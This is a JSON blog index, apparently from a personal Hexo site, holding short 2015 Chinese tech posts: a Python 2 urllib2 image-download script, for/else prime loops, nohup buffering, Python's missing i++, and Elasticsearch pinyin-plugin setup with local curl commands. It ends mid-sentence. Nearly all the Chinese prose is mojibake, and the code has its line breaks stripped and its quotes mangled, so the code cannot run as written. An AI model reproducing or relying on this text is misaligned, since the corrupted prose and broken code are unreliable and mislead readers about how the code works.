Š€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"python ä¸‹è½½url","slug":"history/tech/5953c4d0c2b92f5665eed9b4","date":"2015-12-27T21:01:06.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9b4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9b4/","excerpt":"","text":"#--coding:utf-8--import osimport uuidimport urllib2import cookielibâ€˜â€™â€˜è·å–æ–‡ä»¶åç¼€åâ€™â€™â€™def get_file_extension(file):return os.path.splitext(file)â€˜â€™â€˜å‰µå»ºæ–‡ä»¶ç›®å½•ï¼Œå¹¶è¿”å›è¯¥ç›®å½•â€™â€™â€™def mkdir(path):# å»é™¤å·¦å³ä¸¤è¾¹çš„ç©ºæ ¼path=path.strip()# å»é™¤å°¾éƒ¨ \\ç¬¦å·path=path.rstrip(&quot;\\&quot;)if not os.path.exists(path): os.makedirs(path) return path â€˜â€™â€˜è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„å­—ç¬¦ä¸²ï¼Œå›ºå®šé•¿åº¦ä¸º36â€™â€™â€™def unique_str():return str(uuid.uuid1())â€˜â€™â€™æŠ“å–ç½‘é¡µæ–‡ä»¶å†…å®¹ï¼Œä¿å­˜åˆ°å†…å­˜@url æ¬²æŠ“å–æ–‡ä»¶ ï¼Œpath+filenameâ€˜â€™â€™def get_file(url):try:cj=cookielib.LWPCookieJar()opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))urllib2.install_opener(opener) req=urllib2.Request(url) operate=opener.open(req) data=operate.read() return data except BaseException, e: print e return None â€˜â€™â€™ä¿å­˜æ–‡ä»¶åˆ°æœ¬åœ°@path æœ¬åœ°è·¯å¾„@file_name æ–‡ä»¶å@data æ–‡ä»¶å†…å®¹â€˜â€™â€™def save_file(path, file_name, data):if data == None:returnmkdir(path) if(not path.endswith(&quot;/&quot;)): path=path+&quot;/&quot; file=open(path+file_name, &quot;wb&quot;) file.write(data) file.flush() file.close() #è·å–æ–‡ä»¶åç¼€åprint get_file_extension(â€œ123.jpgâ€);#å‰µå»ºæ–‡ä»¶ç›®å½•ï¼Œå¹¶è¿”å›è¯¥ç›®å½•#print mkdir(â€œd:/ljqâ€)#è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„å­—ç¬¦ä¸²ï¼Œå›ºå®šé•¿åº¦ä¸º36print unique_str()url=â€œhttp://qlogo1.store.qq.com/qzone/416501600/416501600/100?0â€;save_file(â€œd:/ljq/â€, â€œ123.jpgâ€, get_file(url))","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"å…³äºPythonä¸­çš„forå¾ªç¯æ§åˆ¶è¯­å¥","slug":"history/tech/5953c4d0c2b92f5665eed9b3","date":"2015-12-27T20:59:13.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9b3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9b3/","excerpt":"","text":"http://www.cnblogs.com/way_testlife/archive/2010/06/14/1758276.htmlï¼ƒç¬¬ä¸€ä¸ªï¼šæ±‚ 50 - 100 ä¹‹é—´çš„è´¨æ•°import mathfor i in range(50, 100 + 1):for j in range(2, int(math.sqrt(i)) + 1):if i % j == 0:breakelse:print iï¼ƒç¬¬äºŒä¸ªï¼šæŠŠelseçš„ä½ç½®ä¸ifå¤„äºåŒä¸€ç¼©è¿›ã€‚import mathfor i in range(50, 100 + 1):for j in range(2, int(math.sqrt(i)) + 1):if i % j == 0:breakelse:print iï¼ƒç¬¬ä¸‰ä¸ªï¼šåœ¨elseååŠ ä¸€ä¸ªbreakè¯­å¥ã€‚import mathfor i in range(50, 100 + 1):for j in range(2, int(math.sqrt(i)) + 1):if i % j == 0:breakelse:print ibreak###idea###forè¯­å¥æ˜¯pythonä¸­çš„å¾ªç¯æ§åˆ¶è¯­å¥ã€‚å¯ç”¨æ¥éå†æŸä¸€å¯¹è±¡ï¼Œè¿˜å…·æœ‰ä¸€ä¸ªé™„å¸¦çš„å¯é€‰çš„elseå—ï¼Œä¸»è¦ç”¨äºå¤„ç†forè¯­å¥ä¸­åŒ…å«çš„breakè¯­å¥ã€‚å¦‚æœforå¾ªç¯æœªè¢«breakç»ˆæ­¢ï¼Œåˆ™æ‰§è¡Œelseå—ä¸­çš„è¯­å¥ã€‚break åœ¨éœ€è¦æ—¶ç»ˆæ­¢forå¾ªç¯continue è·³è¿‡ä½äºå…¶åçš„è¯­å¥ï¼Œå¼€å§‹ä¸‹ä¸€è½®å¾ªç¯ã€‚forè¯­å¥çš„æ ¼å¼å¦‚ä¸‹ï¼šfor &lt;&gt; in &lt;å¯¹è±¡é›†åˆ&gt;ï¼šâ€¦ if &lt;æ¡ä»¶&gt;:â€¦ breakâ€¦ if &lt;æ¡ä»¶&gt;:â€¦ continueâ€¦ &lt;å…¶ä»–è¯­å¥&gt;â€¦else:â€¦ &lt;&gt;â€¦ï¼ƒå…³äºç¬¬ä¸€ä¸ªç¨‹åºåœ¨è¿™é‡Œï¼Œæˆ‘è§£é‡Šä¸€ä¸‹ä¸ºä½•å¯¼å…¥mathæ¨¡å—ï¼šå¯¼å…¥mathæ¨¡å—å°±æ˜¯ä¸ºäº†å¼€æ–¹ã€‚å¦‚æœå¯¼å…¥äº†mathæ¨¡å—ï¼Œç„¶åå¯¹ i è¿›è¡Œå¼€æ–¹ï¼Œå¯ä»¥å‡å°‘è¿ç®—æ¬¡æ•°ã€‚æ±‚ä¸€ä¸ªæ•°æ˜¯å¦è´¨æ•°ã€‚åªéœ€å¯¹å®ƒè¿›è¡Œè¿™æ ·çš„è¿ç®—ï¼šå°†è¿™ä¸ªæ•°nï¼Œå¾ªç¯ä¸ 2 åˆ° è¿™ä¸ªnçš„å¼€å¹³æ–¹ è¿›è¡Œç›¸é™¤å¦‚æœè¿™ä¸ªåŒºé—´å†…çš„æ‰€æœ‰æ•´æ•°ä¸èƒ½æ•´é™¤nï¼Œåˆ™nä¸ºè´¨æ•°ã€‚è¿™æ ·ï¼Œå°±èŠ‚çœäº†è¿ç®— â€˜å¤§äºnçš„å¼€å¹³æ–¹ å°äºnâ€™ ä¹‹é—´è¿™æ®µè¿ç®—çš„æ—¶é—´ã€‚ç¬¬äºŒï¼Œæˆ‘è§£é‡Šä¸€ä¸‹é‚£â€˜ï¼‹1â€™ï¼šint(math.sqrt(i)) è¾“å‡ºçš„æ˜¯æ¯” içš„å¼€å¹³æ–¹ å° çš„æœ€å¤§æ•´æ•°ã€‚æ¯”å¦‚è¯´ï¼šmath.sqrt(51) ç»“æœæ¯”7å¤§ä¸€ç‚¹ï¼Œè€Œ int(math.sqrt(51)) è¾“å‡ºçš„æ˜¯7è€Œä¸”åœ¨range(m, n)è¿™é‡Œï¼Œrange()å‡½æ•°äº§ç”Ÿçš„æ˜¯ä¸€ä¸ªä» mè‡³n-1çš„æ•´æ•°åˆ—è¡¨ï¼Œå› è€Œéœ€è¦â€˜ï¼‹1â€™ï¼Œä½¿è¿ç®—å®Œæ•´ã€‚é¡ºä¾¿æä¸€ä¸‹range()å‡½æ•°ã€‚range( stop ) # start å¯é€‰å‚æ•°ï¼Œèµ·å§‹æ•° ï¼ƒstop ç»ˆæ­¢æ•°ï¼Œå¦‚æœ range åªæœ‰ä¸€ä¸ªå‚æ•°xï¼Œåˆ™äº§ç”Ÿä¸€ä¸ªåŒ…å« 0 è‡³ x-1 çš„æ•´æ•°åˆ—è¡¨ ï¼ƒstep å¯é€‰å‚æ•°ï¼Œæ­¥é•¿ ï¼ƒç¬¬äºŒä¸ªç¨‹åºelseé‚£è¡Œä¸å¯¹ï¼Œå¦‚æœelseæ”¾åœ¨é‚£ä¸ªåœ°æ–¹çš„è¯ï¼Œä¸€æ—¦æœ‰æŸä¸ªæ•°é‡åˆ°ä¸èƒ½æ•´é™¤è‡ªå·±çš„æ•°ï¼Œå°±ä¼šè¾“å‡ºiï¼Œç›´é“æ‰¾åˆ°ä¸€ä¸ªæ•´é™¤è‡ªå·±ç­‰äº0çš„æ•°ã€‚é‚£æ ·å°±ä¼šè¿ç»­è¾“å‡ºè¿™ä¸ªæ•°ã€‚ä¾‹å¦‚ï¼ši = 77ï¼Œä»–ä¸æ˜¯è´¨æ•°ï¼Œä½†æ˜¯ä¹Ÿä¼šè¿ç»­è¾“å‡º5æ¬¡77ï¼Œæ‡‚ä¸ï¼Ÿåªä¸è¿‡ï¼Œåªæ˜¯è‡ªå·±ä¸æ˜ç™½å½“elseä¸ifä½äºåŒä¸€ç¼©è¿›çš„è¯ï¼Œå®ƒæ˜¯æ€æ ·è¿è¡Œçš„ã€‚ä½ è§£é‡Šå¾—å¾ˆè¯¦ç»†ï¼Œç”¨â€˜èŒ…å¡é¡¿å¼€â€™æ¥å½¢å®¹ä¸€ç‚¹éƒ½ä¸è¿‡åˆ†ã€‚è€Œä¸”ï¼Œæˆ‘å¿…è§‰å¾—ç”»å›¾æ˜¯ç†è§£å¾ªç¯ä¸€ä¸ªéå¸¸å¥½çš„åŠæ³•ã€‚åŸå¸–åœ°å€ï¼ˆLZæ˜¯æœ¬äººï¼‰ï¼šhttp://tieba.baidu.com/f?kz=798217685","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"python nohup print ä¸è¾“å‡º","slug":"history/tech/5953c4d0c2b92f5665eed9b2","date":"2015-12-27T20:58:16.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9b2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9b2/","excerpt":"","text":"nohup python test.py &gt; nohup.out 2&gt;&amp;1 &amp;å‘ç°nohup.outä¸­æ˜¾ç¤ºä¸å‡ºæ¥pythonç¨‹åºä¸­printçš„ä¸œè¥¿ã€‚è¿™æ˜¯å› ä¸ºpythonçš„è¾“å‡ºæœ‰ç¼“å†²ï¼Œå¯¼è‡´nohup.outå¹¶ä¸èƒ½å¤Ÿé©¬ä¸Šçœ‹åˆ°è¾“å‡ºã€‚python æœ‰ä¸ª-uå‚æ•°ï¼Œä½¿å¾—pythonä¸å¯ç”¨ç¼“å†²ã€‚nohup python -u test.py &gt; nohup.out 2&gt;&amp;1 &amp;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"Pythonçš„è‡ªå¢è¿ç®—ç¬¦","slug":"history/tech/5953c4d0c2b92f5665eed9b1","date":"2015-12-27T20:51:16.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9b1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9b1/","excerpt":"","text":"ä»Šå¤©åœ¨å†™ä¸€ä¸ªåˆå¹¶ä¸¤ä¸ªæœ‰è¡€listçš„æ—¶å€™ï¼Œä½¿ç”¨äº†whileå¾ªç¯ï¼Œä¸è‡ªè§‰çš„ä½¿ç”¨äº†i++ï¼Œè‡ªæµ‹çš„æ—¶å€™å‘ç°æœ‰è¯­æ³•é”™è¯¯ï¼Œè¿˜æ£€æŸ¥äº†å¥½å‡ éï¼Œè§‰å¾—åº”è¯¥æ²¡å•¥é”™è¯¯å•Šï¼Œåæ¥googleäº†ä¸€æŠŠï¼Œæç„¶å¤§æ‚Ÿï¼ŒåŸæ¥Pythonæ—©å°±æ”¾å¼ƒäº†è‡ªå¢è¿ç®—ç¬¦ï¼Pythonå“²å­¦çš„ä¸€å¥è¯ï¼šåªç”¨ä¸€ç§æ–¹å¼è§£å†³é—®é¢˜ï¼Œæ‰€ä»¥ä½ è¦çš„è‡ªå¢æ“ä½œå®Œå…¨å¯ä»¥ç”¨i+=1å®Œæˆï¼Œå°±ä¸éœ€è¦i++äº†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"ElasticSearchæ‹¼éŸ³æ’ä»¶elasticsearch-analysis-pinyinä½¿ç”¨ä»‹ç»","slug":"history/tech/5953c4d0c2b92f5665eed9b0","date":"2015-12-27T18:28:46.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9b0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9b0/","excerpt":"","text":"******http://my.oschina.net/xiaohui249/blog/214505**ElasticSearchæ‹¼éŸ³æ’ä»¶elasticsearch-analysis-pinyinä½¿ç”¨ä»‹ç»æ‘˜è¦ elasticsearch-analysis-pinyinæ˜¯ElasticSearchçš„ä¸€ä¸ªåˆ†è¯æ’ä»¶ï¼Œèƒ½å¤Ÿå®ç°æ‹¼éŸ³åˆ†è¯ç´¢å¼•ã€‚æœ¬æ–‡ä¸»è¦ä»‹ç»è¯¥æ’ä»¶çš„å®‰è£…å’Œå…·ä½“ä½¿ç”¨æ–¹æ³•ã€‚http://www.oschina.net/search?scope=blog&amp;q=ElasticSearch http://www.oschina.net/search?scope=blog&amp;q=pinyin4j http://www.oschina.net/search?scope=blog&amp;q=æ’ä»¶å…³äºelasticsearch-analysis-pinyinçš„ä»‹ç»ï¼Œå°±æ­¤çœç•¥ï¼Œçœ‹å®Œæ­¤æ–‡åä½ å°±ä¼šçŸ¥é“å®ƒæœ‰å¤šç¥å¥‡ã€‚ä¸€ã€å®‰è£… å®‰è£…è¯¥æ’ä»¶çš„å‰ææ˜¯ä½ å·²ç»å®‰è£…äº†ES(ElasticSearch)ï¼Œå¦‚æœæ²¡æœ‰å‚ç…§http://www.elasticsearch.cn/guide/reference/setup/installation.htmlã€‚ å®‰è£…è¯¥æ’ä»¶éœ€è¦2ä¸ªjaråŒ…ï¼Œä¸€ä¸ªå½“ç„¶æ˜¯elasticsearch-analysis-pinyin.jarï¼Œå¦ä¸€ä¸ªæ˜¯pinyin4j.jarã€‚å¾ˆå¤šç½‘ç«™éƒ½æœ‰ä¸‹è½½ï¼Œä½†æ˜¯å»ºè®®äº²è‡ªç¼–è¯‘elasticsearch-analysis-pinyinç”Ÿæˆï¼Œå› ä¸ºè¿™æ ·ä¸ä¼šæœ‰ç‰ˆæœ¬é—®é¢˜ã€‚å¥½ï¼Œä¸‹é¢ä»‹ç»ç¼–è¯‘æºç è·å–ä¸Šè¿°ä¸¤ä¸ªjaråŒ…çš„æ–¹æ³•ã€‚ 1ã€ä¸‹è½½æºç ï¼ˆéœ€è¦å®‰è£…äº†gitï¼‰ git clone https://github.com/medcl/elasticsearch-analysis-pinyin.git 2ã€ç¼–è¯‘ï¼ˆéœ€è¦å®‰è£…äº†mavenï¼‰ è¿›å…¥downloadä¸‹æ¥çš„æºç ç›®å½•ï¼šcd elasticsearch-analysis-pinyinï¼Œç„¶åæ‰§è¡Œç¼–è¯‘å‘½ä»¤ï¼šmvn clean install -Dmaven.test.skipã€‚ç¼–è¯‘æˆåŠŸä¹‹åï¼Œä½ å°†åœ¨elasticsearch-analysis-pinyin/targetç›®å½•ä¸­çœ‹åˆ°elasticsearch-analysis-pinyinçš„jaråŒ…ï¼Œæˆ‘ç¼–è¯‘å®Œæˆä¹‹åï¼Œç”Ÿæˆçš„jaråŒ…åç§°ä¸ºï¼šhttp://pan.baidu.com/s/1sjFEjYdï¼Œç„¶åelasticsearch-analysis-pinyin/libç›®å½•ä¸­çœ‹åˆ°pinyin4jçš„jaråŒ…ï¼Œæˆ‘çš„jaråŒ…åç§°ä¸ºï¼šhttp://pan.baidu.com/s/1ntK6cmXã€‚ 3ã€å…·ä½“å®‰è£… åœ¨ES_HOMEç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªpluginsç›®å½•ï¼ˆå¦‚æœæ²¡æœ‰çš„è¯ï¼‰ï¼Œç„¶ååœ¨pluginsç›®å½•ä¸‹åˆ›å»ºpinyinç›®å½•ï¼Œå°†å‰ä¸¤ä¸ªæ­¥éª¤ä¸­å¾—åˆ°çš„jaråŒ…æ‹·è´åˆ°ES_HOME/plugins/pinyinç›®å½•ä¸‹é¢ã€‚okï¼Œæ’ä»¶å®‰è£…åŸºæœ¬å®Œæˆï¼Œeasyå§ï¼ äºŒã€å¦‚ä½•ä½¿ç”¨ é¦–å…ˆå»ºè®®é‡æ–°å¯åŠ¨ESæœåŠ¡ã€‚1ã€åˆ†è¯æµ‹è¯•(1) åˆ›å»ºä¸€ä¸ªæµ‹è¯•ç´¢å¼•ï¼š curl -XPUT http://localhost:9200/medcl/ -dâ€™{ â€œindexâ€ : { â€œanalysisâ€ : { â€œanalyzerâ€ : { â€œpinyin_analyzerâ€ : { â€œtokenizerâ€ : â€œmy_pinyinâ€, â€œfilterâ€ : } }, â€œtokenizerâ€ : { â€œmy_pinyinâ€ : { â€œtypeâ€ : â€œpinyinâ€, â€œfirst_letterâ€ : â€œnoneâ€, â€œpadding_charâ€ : &quot; &quot; } } } }}â€™(2) é€šè¿‡æµè§ˆå™¨è¯·æ±‚åˆ†è¯æ•ˆæœ åœ¨æµè§ˆå™¨è¾“å…¥http://your_es_host:9200/medcl/_analyze?text=%e5%88%98%e5%be%b7%e5%8d%8e&amp;analyzer=pinyin_analyzerè¿”å›ç»“æœå¦‚ä¸‹ï¼Œåˆ†è¯æˆåŠŸï¼Œè¯¥æ’ä»¶èƒ½å¤Ÿè½»æ˜“çš„å¾—åˆ°ä¸­æ–‡å¯¹åº”çš„æ‹¼éŸ³åˆ†è¯ï¼Œç„¶åæœç´¢å¯ä»¥å¯¹è¾“å…¥çš„æ‹¼éŸ³æç¤ºå¯¹åº”çš„ä¸­æ–‡ï¼Œæé«˜æœç´¢ä½“éªŒã€‚{â€œtokensâ€:}http://static.oschina.net/uploads/space/2014/0331/000104_IkNb_1010775.png2ã€ä½¿ç”¨è¯¥æ’ä»¶åˆ›å»ºç´¢å¼•ï¼Œå®ç°ä¸Šå›¾çš„æ‹¼éŸ³æç¤ºåŠŸèƒ½ (1) åˆ›å»ºç©ºç´¢å¼•ï¼Œè®¾ç½®åˆ†è¯å™¨ curl -XPOST http://localhost:9200/medcl/_close (if you had create index â€˜medclâ€™, do this) curl -XPUT http://localhost:9200/medcl/_settings -dâ€™{ â€œindexâ€ : { â€œanalysisâ€ : { â€œanalyzerâ€ : { â€œpinyin_analyzerâ€ : { â€œtokenizerâ€ : , â€œfilterâ€ : } }, â€œtokenizerâ€ : { â€œmy_pinyinâ€ : { â€œtypeâ€ : â€œpinyinâ€, â€œfirst_letterâ€ : â€œprefixâ€, â€œpadding_charâ€ : â€œâ€ } } } }}â€˜curl -XPOST http://localhost:9200/medcl/_open (if you had create index â€˜medclâ€™, do this)(2) åˆ›å»ºhttp://www.cnblogs.com/MrHiFiy/archive/2012/12/06/2806226.htmlï¼Œå³ç´¢å¼•ç»“æ„ä»¥åŠå­—æ®µé…ç½®curl -XPOST http://localhost:9200/medcl/folks/_mapping -dâ€™{ â€œfolksâ€: { â€œpropertiesâ€: { â€œnameâ€: { â€œtypeâ€: â€œmulti_fieldâ€, â€œfieldsâ€: { â€œnameâ€: { â€œtypeâ€: â€œstringâ€, â€œstoreâ€: â€œnoâ€, â€œterm_vectorâ€: â€œwith_positions_offsetsâ€, â€œanalyzerâ€: â€œpinyin_analyzerâ€, â€œboostâ€: 10 }, â€œprimitiveâ€: { â€œtypeâ€: â€œstringâ€, â€œstoreâ€: â€œyesâ€, â€œanalyzerâ€: â€œkeywordâ€ } } } } }}â€™(3) å¼€å§‹ç´¢å¼•æ•°æ®curl -XPOST http://localhost:9200/medcl/folks/andy -dâ€™{â€œnameâ€:â€œåˆ˜å¾·åâ€}â€™(4) æ£€ç´¢æ•°æ®åœ¨æµè§ˆå™¨ä¸€æ¬¡è¾“å…¥ä¸‹é¢çš„è¿æ¥ï¼Œä½ å°†ä¼šæœç´¢å¾—åˆ°ä¸Šé¢ç´¢å¼•çš„é‚£ä¸ªè®°å½•ï¼šåˆ˜å¾·åã€‚http://localhost:9200/medcl/folks/_search?q=name:åˆ˜http://localhost:9200/medcl/folks/_search?q=name:åˆ˜å¾·http://localhost:9200/medcl/folks/_search?q=name:liuhttp://localhost:9200/medcl/folks/_search?q=name:ldhhttp://localhost:9200/medcl/folks/_search?q=name:dehuahttp://static.oschina.net/uploads/space/2014/0331/002234_1U9v_1010775.png","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"redmine githubåœ°å€","slug":"history/tech/5953c4d0c2b92f5665eed9af","date":"2015-12-27T18:26:27.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9af/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9af/","excerpt":"","text":"https://github.com/redmine/redmine","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redmine","slug":"redmine","permalink":"https://wangxiuwen.github.io/tags/redmine/"}],"author":"wangxiuwen"},{"title":"elasticsearchå®‰è£…é…ç½®åŠä¸­æ–‡åˆ†è¯","slug":"history/tech/5953c4d0c2b92f5665eed9ae","date":"2015-12-27T18:17:55.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ae/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ae/","excerpt":"","text":"åŸæ–‡åœ°å€http://www.nosqldb.cn/1368777502778.htmlElasticSearchæ˜¯ä¸€ä¸ªåŸºäºLuceneæ„å»ºçš„å¼€æºï¼Œåˆ†å¸ƒå¼ï¼ŒRESTfulæœç´¢å¼•æ“ã€‚è®¾è®¡ç”¨äºäº‘è®¡ç®—ä¸­ï¼Œèƒ½å¤Ÿè¾¾åˆ°å®æ—¶æœç´¢ï¼Œç¨³å®šï¼Œå¯é ï¼Œå¿«é€Ÿï¼Œå®‰è£…ä½¿ç”¨æ–¹ä¾¿ã€‚æ”¯æŒé€šè¿‡HTTPä½¿ç”¨JSONè¿›è¡Œæ•°æ®ç´¢å¼•ã€‚æˆ‘ä»¬å»ºç«‹ä¸€ä¸ªç½‘ç«™æˆ–åº”ç”¨ç¨‹åºï¼Œå¹¶è¦æ·»åŠ æœç´¢åŠŸèƒ½ï¼Œä»¤æˆ‘ä»¬å—æ‰“å‡»çš„æ˜¯ï¼šæœç´¢å·¥ä½œæ˜¯å¾ˆéš¾çš„ã€‚æˆ‘ä»¬å¸Œæœ›æˆ‘ä»¬çš„æœç´¢è§£å†³æ–¹æ¡ˆè¦å¿«ï¼Œæˆ‘ä»¬å¸Œæœ›æœ‰ä¸€ä¸ªé›¶é…ç½®å’Œä¸€ä¸ªå®Œå…¨å…è´¹çš„æœç´¢æ¨¡å¼ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿç®€å•åœ°ä½¿ç”¨JSONé€šè¿‡HTTPçš„ç´¢å¼•æ•°æ®ï¼Œæˆ‘ä»¬å¸Œæœ›æˆ‘ä»¬çš„æœç´¢æœåŠ¡å™¨å§‹ç»ˆå¯ç”¨ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿä¸€å°å¼€å§‹å¹¶æ‰©å±•åˆ°æ•°ç™¾ï¼Œæˆ‘ä»¬è¦å®æ—¶æœç´¢ï¼Œæˆ‘ä»¬è¦ç®€å•çš„å¤šç§Ÿæˆ·ï¼Œæˆ‘ä»¬å¸Œæœ›å»ºç«‹ä¸€ä¸ªäº‘çš„è§£å†³æ–¹æ¡ˆã€‚Elasticsearchæ—¨åœ¨è§£å†³æ‰€æœ‰è¿™äº›é—®é¢˜å’Œæ›´å¤šçš„ã€‚å®‰è£…ä»¥windowsæ“ä½œç³»ç»Ÿå’ŒES0.19.7ç‰ˆæœ¬ä¸ºä¾‹ï¼šâ‘ ä¸‹è½½elasticsearch-0.19.7.zipâ‘¡ç›´æ¥è§£å‹è‡³æŸç›®å½•ï¼Œè®¾ç½®è¯¥ç›®å½•ä¸ºES_HOMEç¯å¢ƒå˜é‡â‘¢å®‰è£…JDKï¼Œå¹¶è®¾ç½®JAVA_HOMEç¯å¢ƒå˜é‡â‘£åœ¨windowsä¸‹ï¼Œè¿è¡Œ %ES_HOME%\\bin\\elasticsearch.batå³å¯è¿è¡Œåˆ†å¸ƒå¼æœç´¢elasticsearchå•æœºä¸æœåŠ¡å™¨ç¯å¢ƒæ­å»º å…ˆåˆ°http://www.elasticsearch.org/download/ä¸‹è½½æœ€æ–°ç‰ˆçš„elasticsearchè¿è¡ŒåŒ…ï¼Œæœ¬æ–‡å†™æ—¶æœ€æ–°çš„æ˜¯0.19.1ï¼Œä½œè€…æ˜¯ä¸ªå¾ˆå‹¤å¿«çš„äººï¼Œesçš„æ›´æ–°å¾ˆé¢‘ç¹ï¼Œbugä¿®å¤å¾—å¾ˆå¿«ã€‚ä¸‹è½½å®Œè§£å¼€æœ‰ä¸‰ä¸ªåŒ…:binæ˜¯è¿è¡Œçš„è„šæœ¬ï¼Œconfigæ˜¯è®¾ç½®æ–‡ä»¶ï¼Œlibæ˜¯æ”¾ä¾èµ–çš„åŒ…ã€‚å¦‚æœä½ è¦è£…æ’ä»¶çš„è¯å°±è¦å¤šæ–°å»ºä¸€ä¸ªpluginsçš„æ–‡ä»¶å¤¹ï¼ŒæŠŠæ’ä»¶æ”¾åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ã€‚ 1.å•æœºç¯å¢ƒï¼šå•æœºç‰ˆçš„elasticsearchè¿è¡Œå¾ˆç®€å•ï¼Œlinuxä¸‹ç›´æ¥ bin/elasticsearchå°±è¿è¡Œäº†ï¼Œwindowsè¿è¡Œbin/elasticsearch.batã€‚å¦‚æœæ˜¯åœ¨å±€åŸŸç½‘ä¸­è¿è¡Œelasticsearché›†ç¾¤ä¹Ÿæ˜¯å¾ˆç®€å•çš„ï¼Œåªè¦cluster.nameè®¾ç½®ä¸€è‡´ï¼Œå¹¶ä¸”æœºå™¨åœ¨åŒä¸€ç½‘æ®µä¸‹ï¼Œå¯åŠ¨çš„esä¼šè‡ªåŠ¨å‘ç°å¯¹æ–¹ï¼Œç»„æˆé›†ç¾¤ã€‚2.æœåŠ¡å™¨ç¯å¢ƒï¼šå¦‚æœæ˜¯åœ¨æœåŠ¡å™¨ä¸Šå°±å¯ä»¥ä½¿ç”¨elasticsearch-servicewrapperè¿™ä¸ªesæ’ä»¶ï¼Œå®ƒæ”¯æŒé€šè¿‡å‚æ•°ï¼ŒæŒ‡å®šæ˜¯åœ¨åå°æˆ–å‰å°è¿è¡Œesï¼Œå¹¶ä¸”æ”¯æŒå¯åŠ¨ï¼Œåœæ­¢ï¼Œé‡å¯esæœåŠ¡ï¼ˆé»˜è®¤esè„šæœ¬åªèƒ½é€šè¿‡ctrl+cå…³é—­esï¼‰ã€‚ä½¿ç”¨æ–¹æ³•æ˜¯åˆ°https://github.com/elasticsearch/elasticsearch-servicewrapperä¸‹è½½serviceæ–‡ä»¶å¤¹ï¼Œæ”¾åˆ°esçš„binç›®å½•ä¸